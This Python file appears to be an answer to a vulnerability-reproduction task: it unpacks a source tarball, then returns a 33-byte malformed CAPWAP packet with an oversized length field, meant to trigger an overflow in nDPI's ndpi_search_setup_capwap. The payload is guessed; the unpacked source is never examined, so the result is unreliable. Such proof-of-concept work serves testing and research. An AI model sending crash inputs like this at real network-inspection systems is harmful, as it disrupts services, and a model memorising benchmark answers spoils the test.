import os
import subprocess
import tempfile
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Build and analyze the vulnerable program to understand the structure
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract the tarball
            subprocess.run(['tar', 'xf', src_path, '-C', tmpdir], 
                         capture_output=True, check=True)
            
            # Look for the vulnerable function in source files
            source_root = os.path.join(tmpdir, os.listdir(tmpdir)[0])
            
            # Create a minimal CAPWAP packet that triggers the overflow
            # Based on common CAPWAP header structure and the overflow in ndpi_search_setup_capwap
            
            # CAPWAP header structure (simplified):
            # - Version (4 bits) + Type (4 bits): 0x10 (version 1, control)
            # - Length (16 bits): Should cause overflow
            # - Various fields...
            
            # The overflow happens when length field causes reading beyond buffer
            # We'll create a packet with malformed length field
            
            # Ground truth is 33 bytes, so we'll create exactly that
            # First 4 bytes: CAPWAP basic header
            # Version (1) + Type (0) = 0x10
            # Set length to a large value that causes overflow
            # 0xFFFF is maximum for 16-bit length
            
            poc = b''
            
            # CAPWAP header bytes 0-3
            # Byte 0-1: Version/Type + Reserved
            poc += b'\x10\x00'  # Version 1, Type 0, reserved 0
            
            # Byte 2-3: Length - set to large value (0xFFFF = 65535)
            # This should cause buffer overflow when reading
            poc += b'\xFF\xFF'  # Length = 65535
            
            # The rest of the 33 bytes: fill with data that triggers the overflow
            # Need 29 more bytes (33 total - 4 header)
            # Fill with pattern that might contain control data causing the overflow
            poc += b'A' * 29  # Simple pattern, but could be more specific
            
            # Ensure exactly 33 bytes
            assert len(poc) == 33
            
            return poc